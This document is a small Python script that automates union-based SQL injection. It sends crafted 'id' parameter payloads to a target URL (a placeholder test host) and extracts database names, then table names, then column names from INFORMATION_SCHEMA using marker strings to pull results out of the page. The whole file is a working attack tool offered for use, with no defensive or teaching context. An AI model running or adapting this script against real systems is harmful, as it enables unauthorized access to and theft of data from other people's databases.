#! /usr/bin/env python
# _*_  coding:utf-8 _*_
import requests
import urllib
from urllib import parse
import urllib.request
import re
import chardet
values={}

def get(url,values):
    data = urllib.parse.urlencode(values)
    #data1 = data.decode()
    #encode_type = chardet.detect(data)

    print(type(data))
    print(data)
    #print(type(data1))
    #print(encode_type)
    #data = urllib.request.urlopen(values)
    geturl = url+'?'+data

    print(type(geturl))
    response = requests.get(geturl)

    print(type(response))
    result=response.content

    print(type(result))

    result = result.decode()

    print(type(result))

    find_list=re.findall(r"qwe~(.+?)~qwe", result)

    print(find_list)
    if len(find_list)>0:
        return find_list

def get_database_name(url):
    values['id'] = "1 and 1=2 union select 1,concat(0x7177657E,schema_name,0x7E717765) from INFORMATION_SCHEMA.SCHEMATA"
    name_list=get(url,values)
    print ('The databases:')
    for i in name_list:
        print (i+" ",)
    print ("\n")
def table_name(url):
    database_name=input('please input your database:')
    values['id'] = "1  union select 1,concat(0x7177657E,table_name,0x7E717765) from information_schema.tables where table_schema="+"'"+database_name+"'"
    name_list=get(url,values)
    print ('The table is :')
    for i in name_list:
        print (i+" ",)
    print ("\n")
def column_name(url):
    table_name=input('please input your table:')
    values['id'] = "1   union select 1,concat(0x7177657E,column_name,0x7E717765) from information_schema.columns where table_name="+"'"+table_name+"'"
    name_list=get(url,values)
    print ('The column is :')
    for i in name_list:
        print (i+" ",)
if __name__ == '__main__':
    url='http://dev.test.com/login'
    get_database_name(url)
    table_name(url)
    column_name(url)